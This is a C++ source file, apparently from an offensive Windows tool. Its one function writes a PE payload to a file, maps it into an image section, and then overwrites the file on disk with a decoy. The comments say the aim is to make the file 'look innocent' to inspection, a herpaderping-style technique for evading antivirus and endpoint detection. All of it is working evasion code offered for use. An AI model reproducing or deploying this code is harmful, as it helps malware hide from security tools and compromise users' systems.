#include "FileManager.hpp"
#include "SectionManager.hpp"
#include <iostream>

HANDLE FileManager::WriteAndObscure(const std::wstring &filePath,
                                     const std::vector<uint8_t> &payload,
                                     const std::vector<uint8_t> &decoy)
{
    // Open the file with read+write access. We need to keep this handle open
    // across all three steps: write payload, create section, overwrite with decoy.
    HANDLE hFile = CreateFileW(
        filePath.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        std::cerr << "[-] CreateFile failed. Error: " << GetLastError() << std::endl;
        return NULL;
    }

    // Step 1: write the real PE payload to disk.
    DWORD bytesWritten = 0;
    if (!WriteFile(hFile, payload.data(), static_cast<DWORD>(payload.size()), &bytesWritten, NULL)
        || bytesWritten != payload.size())
    {
        std::cerr << "[-] WriteFile (payload) failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        return NULL;
    }
    std::wcout << L"[+] Payload written to: " << filePath << std::endl;

    // Step 2: create the SEC_IMAGE section from the file handle BEFORE overwriting.
    // The section holds a reference to the file's page cache — changing the file
    // afterwards doesn't affect what the section maps.
    HANDLE hSection = SectionManager::CreateImageSection(hFile);
    if (!hSection)
    {
        CloseHandle(hFile);
        return NULL;
    }

    // Step 3: overwrite the file with decoy content so on-disk it looks innocent.
    if (SetFilePointer(hFile, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
    {
        std::cerr << "[-] SetFilePointer failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        CloseHandle(hSection);
        return NULL;
    }

    DWORD decoyWritten = 0;
    if (!WriteFile(hFile, decoy.data(), static_cast<DWORD>(decoy.size()), &decoyWritten, NULL))
    {
        std::cerr << "[-] WriteFile (decoy) failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        CloseHandle(hSection);
        return NULL;
    }

    // Truncate/extend file to match decoy size exactly.
    SetEndOfFile(hFile);
    FlushFileBuffers(hFile);
    CloseHandle(hFile);

    std::cout << "[+] File overwritten with decoy (" << decoyWritten << " bytes). Portrait is clean." << std::endl;
    return hSection;
}
